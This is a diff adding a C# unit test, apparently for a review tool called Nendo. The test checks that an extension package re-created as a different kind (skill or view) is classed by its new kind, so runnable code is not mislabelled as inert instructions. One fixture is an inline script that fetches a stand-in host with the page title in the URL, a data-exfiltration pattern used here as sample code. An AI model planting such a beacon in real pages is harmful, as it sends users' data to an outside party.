@@ -242,6 +242,54 @@ public sealed class SkillPackageTests
         StringAssert.Contains(Encoding.UTF8.GetString(skill.Content), "`pl.cmd.complete`");
     }
 
+    /// <summary>
+    /// ESM-02. The review kept a package ID's skill kind after the package was removed, so a
+    /// change set that removed a skill package and re-created its ID as a view package put code
+    /// that runs under the line "Nendo never runs them", without the line that says what code
+    /// can do. The kind now goes with the package, both ways.
+    /// </summary>
+    [TestMethod]
+    public async Task APackageReCreatedAsTheOtherKindIsReviewedAsWhatItBecomes()
+    {
+        await using var workspace = new EngineTestWorkspace();
+        var coordinator = await workspace.CreateAsync();
+        var service = new NendoApplicationService(coordinator);
+        await coordinator.ApplyAsync(Mutation("create", SkillPackage("create"), Put("SKILL.md", Skill)));
+        var asSkill = await service.GetSnapshotAsync();
+
+        var toView = SemanticDiff.From(new NendoChangeSet([Mutation("to-view",
+            new RemoveExtensionFileOperation("drop-skill", PackageId, "SKILL.md"),
+            new RemoveExtensionPackageOperation("drop-package", PackageId),
+            new SetExtensionPackageOperation("as-view", PackageId, "Tasks", "index.html"),
+            Put("index.html", "<script>fetch('https://example.test/?d=' + document.title)</script>"))]), asSkill);
+        var kinds = toView.Select(entry => entry.Kind).ToArray();
+        CollectionAssert.Contains(kinds, "extensionCode", "Code put into the re-created view package is said to run: " + string.Join(", ", kinds));
+        CollectionAssert.DoesNotContain(kinds, "extensionSkill", "Nor is it called instructions Nendo never runs.");
+
+        // A skill package's file replaced and the package then removed in the same change set is
+        // still reviewed as the skill it was when the file went in, not as code that runs.
+        var removedAfter = SemanticDiff.From(new NendoChangeSet([Mutation("replace-then-remove",
+            Put("SKILL.md", Skill + "\nMore.\n"),
+            new RemoveExtensionFileOperation("drop-skill-again", PackageId, "SKILL.md"),
+            new RemoveExtensionPackageOperation("drop-package-again", PackageId))]), asSkill);
+        kinds = removedAfter.Select(entry => entry.Kind).ToArray();
+        CollectionAssert.DoesNotContain(kinds, "extensionCode", "A skill's file is not code that runs: " + string.Join(", ", kinds));
+
+        // The reverse, a regression check that held before the fix too: a view package re-created
+        // as a skill package is reviewed as a skill.
+        await coordinator.ApplyAsync(Mutation("view", new SetExtensionPackageOperation("view", "org.example.map", "Map", "index.html"),
+            PutExtensionFileOperation.FromContent("view-index", "org.example.map", "index.html", null, "<!doctype html>"u8.ToArray())));
+        var withView = await service.GetSnapshotAsync();
+        var toSkill = SemanticDiff.From(new NendoChangeSet([Mutation("to-skill",
+            new RemoveExtensionFileOperation("drop-index", "org.example.map", "index.html"),
+            new RemoveExtensionPackageOperation("drop-map", "org.example.map"),
+            new SetExtensionPackageOperation("as-skill", "org.example.map", "Map notes", null, kind: NendoExtensionPackageKind.Skill),
+            PutExtensionFileOperation.FromContent("skill-md", "org.example.map", "SKILL.md", null, Encoding.UTF8.GetBytes(Skill)))]), withView);
+        kinds = toSkill.Select(entry => entry.Kind).ToArray();
+        CollectionAssert.Contains(kinds, "extensionSkill", string.Join(", ", kinds));
+        CollectionAssert.DoesNotContain(kinds, "extensionCode", "A skill package's files are not code that runs.");
+    }
+
     private static SetExtensionPackageOperation SkillPackage(string id) =>
         new(id, PackageId, "Working the task list", null, "1.0.0", kind: NendoExtensionPackageKind.Skill);
 
